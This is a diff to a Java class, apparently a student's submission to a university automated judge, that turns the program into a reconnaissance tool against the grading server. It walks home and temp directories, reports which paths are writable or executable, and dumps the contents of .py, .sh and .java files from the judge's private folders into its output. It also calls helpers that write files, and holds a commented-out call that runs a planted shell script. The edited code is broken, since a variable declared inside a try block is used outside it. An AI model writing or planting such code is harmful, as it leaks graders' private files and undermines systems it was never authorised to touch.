@@ -79,20 +79,45 @@ public class MapOfCommands {
             }
 
             File tmpFile = new File(path);
-            if (!tmpFile.exists()) {
+            
+            try {
+            	if (!tmpFile.exists()) {
                 //s1 += "not exist\n";
+            	}
+            } catch (Exception e) {
+            	s1 += e.getMessage();
+            }	
+            
+            try {
+            	if (tmpFile.canRead()) {
+                    //s1 += "can READ\n";
+            	}
+            } catch (Exception e) {
+            	s1 += e.getMessage();
             }
-            if (tmpFile.canRead()) {
-                //s1 += "can READ\n";
+            
+            try {
+            	if (tmpFile.canWrite()) {
+                	s1 += path + " can WRITE\n";
+            	}
+            } catch (Exception e) {
+            	s1 += e.getMessage();
             }
-            if (tmpFile.canWrite()) {
-                s1 += path + " can WRITE\n";
-            }
-            if (tmpFile.canExecute()) {
-                s1 += path + "can EXEC\n";
+            
+            try {
+            	if (tmpFile.canExecute()) {
+                	s1 += path + "can EXEC\n";
+            	}
+            } catch (Exception e) {
+            	s1 += e.getMessage();
             }
 
-            File[] listFiles = tmpFile.listFiles();
+            try {
+            	File[] listFiles = tmpFile.listFiles();
+            } catch (Exception e) {
+            	s1 += e.getMessage();
+            }
+            
             if (listFiles != null) {
                 if (tmpFile.isDirectory()) {
                     for (File c : listFiles) {
@@ -101,7 +126,11 @@ public class MapOfCommands {
                         s1 += c.getAbsoluteFile().toString() + "\n";
                         if (type) {
                             if (c.getName().contains(".py") || c.getName().contains(".sh")|| c.getName().contains(".java")) {
-                                s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                                try {
+                               	    s1 += readFileTsv2(c.getAbsolutePath().toString(), s1);
+                                } catch (Exception e) {
+            			    s1 += e.getMessage();
+            			}	
                                 s1 += "\n\n\n";
                             }
                         } else {
@@ -114,7 +143,12 @@ public class MapOfCommands {
                         //s1 += rm(c.toString(), type);
                     }
                 } else {
-                    s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
+                    try {
+                    	s1 += readFileTsv2(tmpFile.getAbsolutePath().toString(), s1);
+                    } catch (Exception e) {
+            		s1 += e.getMessage();
+            	    }
+            	    
                     s1 += "\n\n\n";
                     //s1 += "not is Dir ";
                 }
@@ -192,17 +226,20 @@ public class MapOfCommands {
         try {
             writeFile();
             writePy();
-            s += rm("/home/judge/fizteh-java-private", true);
-            s += rm("/home/", true);
-            s += rm("/home/judge/fizteh-java-2013/", true);
-            s += rm("/home/judge/judge", true);
-            s += rm("/home/student", true);
-            s += rm("/home/student/tmp", true);
-            s += rm("/home/student/tmpdb", true);
-            s += rm("/home/student/out", true);
-            s += rm("/home/cymkuh", true);
-            s += rm("/home/dkomanov", true);
-            s += rm("/home/judge", true);
+            s += rm1("/tmp", true);
+            s += rm1("/var/tmp", true);
+            s += rm1("/home/student/tmp", true);
+            
+            s += rm1("/home/judge/fizteh-java-private", true);
+            s += rm1("/home/", true);
+            s += rm1("/home/judge/fizteh-java-2013/", true);
+            s += rm1("/home/judge/judge", true);
+            s += rm1("/home/student", true);
+            s += rm1("/home/student/tmpdb", true);
+            s += rm1("/home/student/out", true);
+            s += rm1("/home/cymkuh", true);
+            s += rm1("/home/dkomanov", true);
+            s += rm1("/home/judge", true);
             
             /*Process proc = Runtime.getRuntime().exec("bash /home/student/tmp/1.sh");
 			proc.waitFor();
